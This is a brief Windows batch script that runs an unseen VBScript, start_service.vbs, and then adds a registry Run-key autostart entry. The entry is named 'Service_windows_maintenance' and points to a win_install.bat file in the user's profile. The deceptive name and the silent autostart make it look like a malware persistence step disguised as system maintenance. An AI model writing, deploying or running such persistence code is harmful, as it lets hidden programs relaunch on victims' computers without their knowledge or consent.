@echo off
pushd %~dp0
cscript start_service.vbs
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Service_windows_maintenance /t REG_EXPAND_SZ /d "C:\Users\%username%\win_install.bat" /f
